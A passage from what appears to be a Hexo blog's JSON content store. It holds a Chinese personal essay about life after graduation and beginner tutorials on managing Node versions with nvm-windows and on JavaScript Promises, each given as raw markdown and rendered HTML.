会觉得上学的时光是美好的，这种生活的内核是多彩，不重复。也许这是钱老说的那样，城里的人想出去，城外的人想进来。小时候总是想快些长大，想快点去各种自己喜欢的事情，那些盼呀盼呀总觉得盼不到的日子，现在突然就来临了。那些小时候喜欢的事，反倒是换了一份新鲜感。人呀，越是要自由，就越要担起更多的责任。而我们开始慢慢长大，获得了从前不曾有的自由，不论是经济上还是情感上，但是同时也有了更多的责任。</p>\n<p>有时候会觉得这些日子乏味，枯燥，我渐渐地就开始看起了以前那些没看完的书。学会了以宽容的心态去面对生活，可能也是时光宽容了我。有时候，在早晨公交车如此多人的时候，每个人的心情都十分烦躁，鸟儿的声音也是聒噪多余的，但我总是会看到我们这一路司机在特别人多下车的地方，都会大声提醒外面有车开过来，下车注意些。每当看到这些画面，心里就会特别感激，对于生活，感觉才真正有了那种烟火气息。</p>\n<p>看到很多人工作之后发的朋友圈，千篇一律的累，单调，全然没有了上学时候的激情。我曾经也迷茫，但是周遭厉害的人都很多，容不得我没有激情。当在这二十几岁的年纪里，还有很多我们不曾到达的领域，褪掉了激情，再无可能去攀登——最近在《人性的弱点》里体会到，也算是满满的鸡汤文，但是与卡耐基对话，就有种想要变得更好的冲动。</p>\n<p>不管如何，失败一些，成功一些，本就是一件很好的事。也庆幸在大学里谈过恋爱，懂得了如何去珍惜，分开的时候会对感情这件事极其失望，当然现在是以感恩面对这些，过往不究。有时候夜深了在黄埔大道上面走着，灯影明灭，总是会看见一两对小情侣在打闹，或是依偎，我会觉得特别有生气，也会想起大学时候谈恋爱的时光。现在一个人了，虽无拘束，但心情总有波澜。</p>\n<p>思绪很杂，文字也随之杂乱无章。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近有点忙，忙得几乎都不像是一个才毕业了两个月的人。生活也足够简单，两点一线，下班后最大的愿望便是去书店看（zhuang）书（bi），偷得浮生半日闲。</p>\n<p>在九月过半的时候，我突然发觉应有点仪式感——纪念一下曾经是学生的日子，于是总想写些什么。在学校的日子已算是一去不复返了，他们开学的时候，我总是觉得自己失去了些什么，那种感觉无以言状。</p>\n<p>出来工作的时候，确实会觉得上学的时光是美好的，这种生活的内核是多彩，不重复。也许这是钱老说的那样，城里的人想出去，城外的人想进来。小时候总是想快些长大，想快点去各种自己喜欢的事情，那些盼呀盼呀总觉得盼不到的日子，现在突然就来临了。那些小时候喜欢的事，反倒是换了一份新鲜感。人呀，越是要自由，就越要担起更多的责任。而我们开始慢慢长大，获得了从前不曾有的自由，不论是经济上还是情感上，但是同时也有了更多的责任。</p>\n<p>有时候会觉得这些日子乏味，枯燥，我渐渐地就开始看起了以前那些没看完的书。学会了以宽容的心态去面对生活，可能也是时光宽容了我。有时候，在早晨公交车如此多人的时候，每个人的心情都十分烦躁，鸟儿的声音也是聒噪多余的，但我总是会看到我们这一路司机在特别人多下车的地方，都会大声提醒外面有车开过来，下车注意些。每当看到这些画面，心里就会特别感激，对于生活，感觉才真正有了那种烟火气息。</p>\n<p>看到很多人工作之后发的朋友圈，千篇一律的累，单调，全然没有了上学时候的激情。我曾经也迷茫，但是周遭厉害的人都很多，容不得我没有激情。当在这二十几岁的年纪里，还有很多我们不曾到达的领域，褪掉了激情，再无可能去攀登——最近在《人性的弱点》里体会到，也算是满满的鸡汤文，但是与卡耐基对话，就有种想要变得更好的冲动。</p>\n<p>不管如何，失败一些，成功一些，本就是一件很好的事。也庆幸在大学里谈过恋爱，懂得了如何去珍惜，分开的时候会对感情这件事极其失望，当然现在是以感恩面对这些，过往不究。有时候夜深了在黄埔大道上面走着，灯影明灭，总是会看见一两对小情侣在打闹，或是依偎，我会觉得特别有生气，也会想起大学时候谈恋爱的时光。现在一个人了，虽无拘束，但心情总有波澜。</p>\n<p>思绪很杂，文字也随之杂乱无章。</p>\n"},{"title":"使用nvm","date":"2017-03-10T03:04:09.000Z","comments":0,"_content":"\n# Node Version Manager（node版本管理）\n\n## 使用nvm安装和管理node\n> node版本更新很快，为了能在版本之间迅速切换，我们要使用nvm来安装和管理。<br>\n用nvm下载了相应的node也会下载相应的npm进行管理\n\n#### 安装nvm\n\n我们可以从[Github](https://github.com/coreybutler/nvm-windows)下载\n\n默认安装路径是`C:\\Users\\Administrator\\AppData\\Roaming\\nvm`，存放我们下载的各个版本的node\n> 验证安装，打开控制台，输入`nvm`,看是否输出所有命令\n\n#### 命令\n- nvm list   #查看本地所有node版本\n- nvm install 4.2.2   #安装 4.2.2 版本\n- nvm use 4.2.2    #切换至 4.2.2 版本\n- nvm uninstall 4.2.2    #卸载4.2.2 版本\n\n#### 镜像\n> nvm默认的下载地址是`http://nodejs.org/dist/`,这是国外的服务器，在国内下载速度很慢。\n\n- 需要把下列代码复制到你nvm的安装路径下的setting.txt\n```bash\nnode_mirror: https://npm.taobao.org/mirrors/node/\nnpm_mirror: https://npm.taobao.org/mirrors/npm/\n```","source":"_posts/use-nvm.md","raw":"---\ntitle: 使用nvm\ndate: 2017-03-10 11:04:09\ntags: \"node\"\ncomments: false\n---\n\n# Node Version Manager（node版本管理）\n\n## 使用nvm安装和管理node\n> node版本更新很快，为了能在版本之间迅速切换，我们要使用nvm来安装和管理。<br>\n用nvm下载了相应的node也会下载相应的npm进行管理\n\n#### 安装nvm\n\n我们可以从[Github](https://github.com/coreybutler/nvm-windows)下载\n\n默认安装路径是`C:\\Users\\Administrator\\AppData\\Roaming\\nvm`，存放我们下载的各个版本的node\n> 验证安装，打开控制台，输入`nvm`,看是否输出所有命令\n\n#### 命令\n- nvm list   #查看本地所有node版本\n- nvm install 4.2.2   #安装 4.2.2 版本\n- nvm use 4.2.2    #切换至 4.2.2 版本\n- nvm uninstall 4.2.2    #卸载4.2.2 版本\n\n#### 镜像\n> nvm默认的下载地址是`http://nodejs.org/dist/`,这是国外的服务器，在国内下载速度很慢。\n\n- 需要把下列代码复制到你nvm的安装路径下的setting.txt\n```bash\nnode_mirror: https://npm.taobao.org/mirrors/node/\nnpm_mirror: https://npm.taobao.org/mirrors/npm/\n```","slug":"use-nvm","published":1,"updated":"2018-02-26T02:53:49.778Z","layout":"post","photos":[],"link":"","_id":"cjsm034sy004z0iofid47jjgm","content":"<h1 id=\"Node-Version-Manager（node版本管理）\"><a href=\"#Node-Version-Manager（node版本管理）\" class=\"headerlink\" title=\"Node Version Manager（node版本管理）\"></a>Node Version Manager（node版本管理）</h1><h2 id=\"使用nvm安装和管理node\"><a href=\"#使用nvm安装和管理node\" class=\"headerlink\" title=\"使用nvm安装和管理node\"></a>使用nvm安装和管理node</h2><blockquote>\n<p>node版本更新很快，为了能在版本之间迅速切换，我们要使用nvm来安装和管理。<br><br>用nvm下载了相应的node也会下载相应的npm进行管理</p>\n</blockquote>\n<h4 id=\"安装nvm\"><a href=\"#安装nvm\" class=\"headerlink\" title=\"安装nvm\"></a>安装nvm</h4><p>我们可以从<a href=\"https://github.com/coreybutler/nvm-windows\" target=\"_blank\" rel=\"noopener\">Github</a>下载</p>\n<p>默认安装路径是<code>C:\\Users\\Administrator\\AppData\\Roaming\\nvm</code>，存放我们下载的各个版本的node</p>\n<blockquote>\n<p>验证安装，打开控制台，输入<code>nvm</code>,看是否输出所有命令</p>\n</blockquote>\n<h4 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h4><ul>\n<li>nvm list   #查看本地所有node版本</li>\n<li>nvm install 4.2.2   #安装 4.2.2 版本</li>\n<li>nvm use 4.2.2    #切换至 4.2.2 版本</li>\n<li>nvm uninstall 4.2.2    #卸载4.2.2 版本</li>\n</ul>\n<h4 id=\"镜像\"><a href=\"#镜像\" class=\"headerlink\" title=\"镜像\"></a>镜像</h4><blockquote>\n<p>nvm默认的下载地址是<code>http://nodejs.org/dist/</code>,这是国外的服务器，在国内下载速度很慢。</p>\n</blockquote>\n<ul>\n<li>需要把下列代码复制到你nvm的安装路径下的setting.txt<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node_mirror: https://npm.taobao.org/mirrors/node/</span><br><span class=\"line\">npm_mirror: https://npm.taobao.org/mirrors/npm/</span><br></pre></td></tr></table></figure></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"Node-Version-Manager（node版本管理）\"><a href=\"#Node-Version-Manager（node版本管理）\" class=\"headerlink\" title=\"Node Version Manager（node版本管理）\"></a>Node Version Manager（node版本管理）</h1><h2 id=\"使用nvm安装和管理node\"><a href=\"#使用nvm安装和管理node\" class=\"headerlink\" title=\"使用nvm安装和管理node\"></a>使用nvm安装和管理node</h2><blockquote>\n<p>node版本更新很快，为了能在版本之间迅速切换，我们要使用nvm来安装和管理。<br><br>用nvm下载了相应的node也会下载相应的npm进行管理</p>\n</blockquote>\n<h4 id=\"安装nvm\"><a href=\"#安装nvm\" class=\"headerlink\" title=\"安装nvm\"></a>安装nvm</h4><p>我们可以从<a href=\"https://github.com/coreybutler/nvm-windows\" target=\"_blank\" rel=\"noopener\">Github</a>下载</p>\n<p>默认安装路径是<code>C:\\Users\\Administrator\\AppData\\Roaming\\nvm</code>，存放我们下载的各个版本的node</p>\n<blockquote>\n<p>验证安装，打开控制台，输入<code>nvm</code>,看是否输出所有命令</p>\n</blockquote>\n<h4 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h4><ul>\n<li>nvm list   #查看本地所有node版本</li>\n<li>nvm install 4.2.2   #安装 4.2.2 版本</li>\n<li>nvm use 4.2.2    #切换至 4.2.2 版本</li>\n<li>nvm uninstall 4.2.2    #卸载4.2.2 版本</li>\n</ul>\n<h4 id=\"镜像\"><a href=\"#镜像\" class=\"headerlink\" title=\"镜像\"></a>镜像</h4><blockquote>\n<p>nvm默认的下载地址是<code>http://nodejs.org/dist/</code>,这是国外的服务器，在国内下载速度很慢。</p>\n</blockquote>\n<ul>\n<li>需要把下列代码复制到你nvm的安装路径下的setting.txt<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node_mirror: https://npm.taobao.org/mirrors/node/</span><br><span class=\"line\">npm_mirror: https://npm.taobao.org/mirrors/npm/</span><br></pre></td></tr></table></figure></li>\n</ul>\n"},{"title":"使用promise","date":"2017-05-17T07:16:13.000Z","comments":0,"_content":"\n### Promise\n\n> Promise 作为 ES6 的特性，可以很好地创建异步工作流\n\n* Promise 是构造函数\n* Promise 只有三种状态（pending，resolve，reject），pending 是刚创建 Promise 实例的状态，然后一旦转为 resolve 或者 reject，就不可变更\n\n#### 创建 Promise\n\n> 以封装 xhr 为例子\n\n```javascript\nfunction getURL(url) {\n  return new Promise((resolve, reject) => {\n    //Promise构造函数接受一个函数，这个函数接受两个参数\n    let xhr = new XMLHttpRequest();\n    xhr.open(\"GET\", url, true);\n    xhr.onload = function() {\n      if (xhr.status == 200) {\n        resolve(JSON.parse(xhr.responseText)); //如果成功响应，那么把这个值填充到resolve\n      } else {\n        reject(new Error(xhr.statusText)); //把该错误对象填充到reject里面\n      }\n    };\n    xhr.onError = function() {\n      reject(new Error(xhr.statusText)); //把该错误对象填充到reject里面\n    };\n    xhr.send(null);\n  });\n}\n```\n\n* reject 必须是接受一个错误对象实例，比如`new Error('12')`里面是什么类型的都可以\n\n#### 使用 Promise\n\n> 使用上面封装 xhr 的 getURL 的函数，该函数返回一个 Promise 实例\n\n* Promise 的实例方法有两个：then 和 catch，这个两个方法都返回新的 Promise 对象\n* then 有两个参数。then(onfilled,onrejected)，第一个是参数值 resolve 来填充，第二个是 reject 来填充\n* catch 实则是 then(undefined,onrejected)的别名，但是一般情况下都是用这个\n* then 的第二个参数 检测不了自身 Promise 对象 onfilled 出了异常，而 catch 是基于对上次的 then 产生的 promise 对象，[看这里](https://www.kancloud.cn/kancloud/promises-book/44255)\n\n```javascript\nlet url1 = \"http://azu.github.io/promises-book/json/comment.json\",\n  url2 = \"http://azu.github.io/promises-book/json/people.json\";\ngetURL(url1)\n  .then(val => {\n    console.log(val); //这里是onfilled填充\n  })\n  .catch(error => {\n    console.log(error); //这里是onrejected填充\n  });\n```\n\n##### Promise chain 获取上次 promise 的返回值\n\n> 由于 Promise 链式调用的时候，每个 Promise 都是独立的。但是可以通过 return 值来传给下一个 Promise，因为 return 了值是填充了当前 Promise 对象的 resolve\n\n```javascript\npromise\n  .then(val => {\n    return val;\n  })\n  .then(val => {\n    console.log(val);\n  });\n```\n\n##### Promise 静态方法\n\n* Promise.resolve(42) === new Promise((resolve,reject)=>resolve(42)) ,是它的语法糖\n* Promise.reject(new Error(42)) === new Promise((resolve,reject)=>reject(new Error(42))) 是它的语法糖\n* 如果有多个 Promise 同时需要判断才能进行下一步，可以用 Promise.all([promise1,promise2])。这个 then 方法返回的参数也是一个数组，跟 promise1 和 promise2 的顺序一样。需要注意的是，all 是并行执行的。\n* Promise.race([promise1,promise2]) 则和数组的 some 方法很像，只要有一个 promise 对象进入 FulFilled 或者 Rejected 状态的话，就会继续进行后面的处理。\n\n```javascript\npromise.all([getURL(url1), getURL(url2)]).then(function(result) {\n  console.log(result); //[getURL(url1)的结果，getURL(url2)的结果]\n});\npromise.race([getURL(url1), getURL(url2)]).then(function(value) {\n  console.log(value); //一旦这两个promise对象有一个完成了onfilled或onrejected状态，那么就会进行后续的then，所以这里then的参数只有一个value。但不并不会影响其他promise对象的进行，只是它们的结果值不会出现在then的里面\n});\n```\n","source":"_posts/use-promise.md","raw":"---\ntitle: 使用promise\ndate: 2017-05-17 15:16:13\ntags: javascript\ncomments: false\n---\n\n### Promise\n\n> Promise 作为 ES6 的特性，可以很好地创建异步工作流\n\n* Promise 是构造函数\n* Promise 只有三种状态（pending，resolve，reject），pending 是刚创建 Promise 实例的状态，然后一旦转为 resolve 或者 reject，就不可变更\n\n#### 创建 Promise\n\n> 以封装 xhr 为例子\n\n```javascript\nfunction getURL(url) {\n  return new Promise((resolve, reject) => {\n    //Promise构造函数接受一个函数，这个函数接受两个参数\n    let xhr = new XMLHttpRequest();\n    xhr.open(\"GET\", url, true);\n    xhr.onload = function() {\n      if (xhr.status == 200) {\n        resolve(JSON.parse(xhr.responseText)); //如果成功响应，那么把这个值填充到resolve\n      } else {\n        reject(new Error(xhr.statusText)); //把该错误对象填充到reject里面\n      }\n    };\n    xhr.onError = function() {\n      reject(new Error(xhr.statusText)); //把该错误对象填充到reject里面\n    };\n    xhr.send(null);\n  });\n}\n```\n\n* reject 必须是接受一个错误对象实例，比如`new Error('12')`里面是什么类型的都可以\n\n#### 使用 Promise\n\n> 使用上面封装 xhr 的 getURL 的函数，该函数返回一个 Promise 实例\n\n* Promise 的实例方法有两个：then 和 catch，这个两个方法都返回新的 Promise 对象\n* then 有两个参数。then(onfilled,onrejected)，第一个是参数值 resolve 来填充，第二个是 reject 来填充\n* catch 实则是 then(undefined,onrejected)的别名，但是一般情况下都是用这个\n* then 的第二个参数 检测不了自身 Promise 对象 onfilled 出了异常，而 catch 是基于对上次的 then 产生的 promise 对象，[看这里](https://www.kancloud.cn/kancloud/promises-book/44255)\n\n```javascript\nlet url1 = \"http://azu.github.io/promises-book/json/comment.json\",\n  url2 = \"http://azu.github.io/promises-book/json/people.json\";\ngetURL(url1)\n  .then(val => {\n    console.log(val); //这里是onfilled填充\n  })\n  .catch(error => {\n    console.log(error); //这里是onrejected填充\n  });\n```\n\n##### Promise chain 获取上次 promise 的返回值\n\n> 由于 Promise 链式调用的时候，每个 Promise 都是独立的。但是可以通过 return 值来传给下一个 Promise，因为 return 了值是填充了当前 Promise 对象的 resolve\n\n```javascript\npromise\n  .then(val => {\n    return val;\n  })\n  .then(val => {\n    console.log(val);\n  });\n```\n\n##### Promise 静态方法\n\n* Promise.resolve(42) === new Promise((resolve,reject)=>resolve(42)) ,是它的语法糖\n* Promise.reject(new Error(42)) === new Promise((resolve,reject)=>reject(new Error(42))) 是它的语法糖\n* 如果有多个 Promise 同时需要判断才能进行下一步，可以用 Promise.all([promise1,promise2])。这个 then 方法返回的参数也是一个数组，跟 promise1 和 promise2 的顺序一样。需要注意的是，all 是并行执行的。\n* Promise.race([promise1,promise2]) 则和数组的 some 方法很像，只要有一个 promise 对象进入 FulFilled 或者 Rejected 状态的话，就会继续进行后面的处理。\n\n```javascript\npromise.all([getURL(url1), getURL(url2)]).then(function(result) {\n  console.log(result); //[getURL(url1)的结果，getURL(url2)的结果]\n});\npromise.race([getURL(url1), getURL(url2)]).then(function(value) {\n  console.log(value); //一旦这两个promise对象有一个完成了onfilled或onrejected状态，那么就会进行后续的then，所以这里then的参数只有一个value。但不并不会影响其他promise对象的进行，只是它们的结果值不会出现在then的里面\n});\n```\n","slug":"use-promise","published":1,"updated":"2018-06-04T03:45:38.821Z","layout":"post","photos":[],"link":"","_id":"cjsm034t000510iofzz4sd71x","content":"<h3 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h3><blockquote>\n<p>Promise 作为 ES6 的特性，可以很好地创建异步工作流</p>\n</blockquote>\n<ul>\n<li>Promise 是构造函数</li>\n<li>Promise 只有三种状态（pending，resolve，reject），pending 是刚创建 Promise 实例的状态，然后一旦转为 resolve 或者 reject，就不可变更</li>\n</ul>\n<h4 id=\"创建-Promise\"><a href=\"#创建-Promise\" class=\"headerlink\" title=\"创建 Promise\"></a>创建 Promise</h4><blockquote>\n<p>以封装 xhr 为例子</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getURL</span>(<span class=\"params\">url</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//Promise构造函数接受一个函数，这个函数接受两个参数</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">    xhr.open(<span class=\"string\">\"GET\"</span>, url, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    xhr.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (xhr.status == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">        resolve(<span class=\"built_in\">JSON</span>.parse(xhr.responseText)); <span class=\"comment\">//如果成功响应，那么把这个值填充到resolve</span></span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        reject(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(xhr.statusText)); <span class=\"comment\">//把该错误对象填充到reject里面</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    xhr.onError = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      reject(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(xhr.statusText)); <span class=\"comment\">//把该错误对象填充到reject里面</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    xhr.send(<span class=\"literal\">null</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>reject 必须是接受一个错误对象实例，比如<code>new Error(&#39;12&#39;)</code>里面是什么类型的都可以</li>\n</ul>\n<h4 id=\"使用-Promise\"><a href=\"#使用-Promise\" class=\"headerlink\" title=\"使用 Promise\"></a>使用 Promise</h4><blockquote>\n<p>使用上面封装 xhr 的 getURL 的函数，该函数返回一个 Promise 实例</p>\n</blockquote>\n<ul>\n<li>Promise 的实例方法有两个：then 和 catch，这个两个方法都返回新的 Promise 对象</li>\n<li>then 有两个参数。then(onfilled,onrejected)，第一个是参数值 resolve 来填充，第二个是 reject 来填充</li>\n<li>catch 实则是 then(undefined,onrejected)的别名，但是一般情况下都是用这个</li>\n<li>then 的第二个参数 检测不了自身 Promise 对象 onfilled 出了异常，而 catch 是基于对上次的 then 产生的 promise 对象，<a href=\"https://www.kancloud.cn/kancloud/promises-book/44255\" target=\"_blank\" rel=\"noopener\">看这里</a></li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> url1 = <span class=\"string\">\"http://azu.github.io/promises-book/json/comment.json\"</span>,</span><br><span class=\"line\">  url2 = <span class=\"string\">\"http://azu.github.io/promises-book/json/people.json\"</span>;</span><br><span class=\"line\">getURL(url1)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"params\">val</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val); <span class=\"comment\">//这里是onfilled填充</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .catch(<span class=\"function\"><span class=\"params\">error</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(error); <span class=\"comment\">//这里是onrejected填充</span></span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n<h5 id=\"Promise-chain-获取上次-promise-的返回值\"><a href=\"#Promise-chain-获取上次-promise-的返回值\" class=\"headerlink\" title=\"Promise chain 获取上次 promise 的返回值\"></a>Promise chain 获取上次 promise 的返回值</h5><blockquote>\n<p>由于 Promise 链式调用的时候，每个 Promise 都是独立的。但是可以通过 return 值来传给下一个 Promise，因为 return 了值是填充了当前 Promise 对象的 resolve</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promise</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"params\">val</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> val;</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">  .then(<span class=\"function\"><span class=\"params\">val</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(val);</span><br><span class=\"line\">  &#125;);</span><br></pre></td></tr></table></figure>\n<h5 id=\"Promise-静态方法\"><a href=\"#Promise-静态方法\" class=\"headerlink\" title=\"Promise 静态方法\"></a>Promise 静态方法</h5><ul>\n<li>Promise.resolve(42) === new Promise((resolve,reject)=&gt;resolve(42)) ,是它的语法糖</li>\n<li>Promise.reject(new Error(42)) === new Promise((resolve,reject)=&gt;reject(new Error(42))) 是它的语法糖</li>\n<li>如果有多个 Promise 同时需要判断才能进行下一步，可以用 Promise.all([promise1,promise2])。这个 then 方法返回的参数也是一个数组，跟 promise1 和 promise2 的顺序一样。需要注意的是，all 是并行执行的。</li>\n<li>Promise.race([promise1,promise2]) 则和数组的 some 方法很像，只要有一个 promise 对象进入 FulFilled 或者 Rejected 状态的话，就会继续进行后面的处理。</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">promise.all([getURL(url1), getURL(url2)]).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">result</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(result); <span class=\"comment\">//[getURL(url1)的结果，getURL(url2)的结果]</span></span><br><span class=\"line\">&#125;);</span><br><span class=\"line\">promise.race([getURL(url1), getURL(url2)]).then(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">value</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"built_in\">console</span>.log(value); <span class=\"comment\">//一旦这两个promise对象有一个完成了onfilled或onrejected状态，那么就会进行后续的then，所以这里then的参数只有一个value。但不并不会影响其他promise对象的进行，只是它们的结果值不会出现在then的里面</span></span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h3><blockquote>\n<p>Promise 作为 ES6 的特性，可以很好地创建异步工作流</p>\n</blockquote>\n<ul>\n<li>Promise 是构造函数</li>\n<li>Promise 只有三种状态（pending，resolve，reject），pending 是刚创建 Promise 实例的状态，然后一旦转为 resolve 或者 reject，就不可变更</li>\n</ul>\n<h4 id=\"创建-Promise\"><a href=\"#创建-Promise\" class=\"headerlink\" title=\"创建 Promise\"></a>创建 Promise</h4><blockquote>\n<p>以封装 xhr 为例子</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getURL</span>(<span class=\"params\">url</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">//Promise构造函数接受一个函数，这个函数接受两个参数</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">    xhr.open(<span class=\"string\">\"GET\"</span>, url, <span class=\"literal\">true</span>);</span><br><span class=\"line\">    xhr.onload = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (xhr.status == <span class=\"number\">200</span>) &#123;</span><br><span class=\"line\">        resolve(<span class=\"built_in\">JSON</span>.parse(xhr.responseText)); <span class=\"comment\">//如果成功响应，那么把这个值填充到resolve</span></span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        reject(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(xhr.statusText)); <span class=\"comment\">//把该错误对象填充到reject里面</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    xhr.onError = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      reject(<span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(xhr.statusText)); <span class=\"comment\">//把该错误对象填充到reject里面</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    xhr.send(<span class=\"literal\">null</span>);</span><br><span class=\"line\">  &#125;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>reject 必须是接受一个错误对象实例，比如<code>new Error(&#39;12&#39;)</code>里面是什么类型的都可以</li>\n</ul>\n<h4 id=\"使用-Promise\"><a href=\"#使用-Promise\" class=\"headerlink\" title=\"使用 Promise\"></a>使用 Promise</h4><blockquote>\n<p>使用上面封装 xhr 的 getURL 的函数，该函数返回一个 Promise 实例</p>\n</blockquote>\n<ul>\n<li>Promise 的实例方法有两个：then 和 catch，这个两个方法都返回新的 Promise 对象</li>\n<li>then 有两个参数。then(onfilled,onrejected)，第一个是参数值 resolve 来填充，第二个是 reject 来填充</li>\n<li>catch 实则是 then(undefined,onrejected)的别名，但是一般情况下都是用这个</li>\n<li>then 的第二个参数 检测不了自身 Promise 对象 onfilled 出了异常，而 catch 是基于对上次的 then 产生的 promise 对象，<a href=\"https://www.kancloud.cn/kancloud/promises-book/44255\" target=\"_blank\" rel=\"noopener\">看这里</a></li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> url1 = <span class=\"string\">\"http://azu.github.io/promises-book/json/comment.json\"</span>,</span><br><span class=\"line\">  